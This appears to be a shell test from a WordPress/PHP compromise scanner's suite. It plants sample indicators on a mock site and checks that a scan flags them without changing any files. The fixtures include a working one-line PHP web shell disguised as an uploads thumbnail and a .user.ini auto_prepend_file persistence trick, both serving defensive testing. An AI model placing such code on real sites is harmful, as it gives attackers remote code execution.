# The core promise: a full run, every section, against a fully planted system,
# changes nothing on disk. (The whole suite also runs with --network none.)
. /src/tests/lib.sh

mk_wordpress /var/www/html
echo '<?php @eval(base64_decode($_POST["x"]));' > /var/www/html/wp-content/uploads/2026/10/thumb.php
echo 'auto_prepend_file=/tmp/.x.php' > /var/www/html/.user.ini
mkdir -p /var/lib/php/sessions /var/log/nginx
printf 'upload_progress_x|a:0:{}' > /var/lib/php/sessions/sess_0123456789abcdef0123456789abcdef
echo 'PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted in Unknown on line 0' > /var/log/nginx/error.log
gzip -c /var/log/nginx/error.log > /var/log/nginx/error.log.1.gz
printf '#!/bin/sh\n' > /tmp/.x; chmod +x /tmp/.x

# Control: the listing is stable when nothing runs in between.
a=$(fs_listing); b=$(fs_listing)
assert_same_fs "$a" "$b" "control: two listings with nothing in between are identical"

before=$(fs_listing)
run_ioc
after=$(fs_listing)
assert_rc 2 "full run on a planted system finds flags"
assert_same_fs "$before" "$after" "filesystem unchanged after a full run (no files created, removed or modified)"

before=$(fs_listing)
run_ioc_stdin 'PHP Fatal error:  Allowed memory size of 1 bytes exhausted in Unknown on line 0' --only logs --log -
after=$(fs_listing)
assert_same_fs "$before" "$after" "filesystem unchanged after reading logs from stdin (no temp files)"

finish
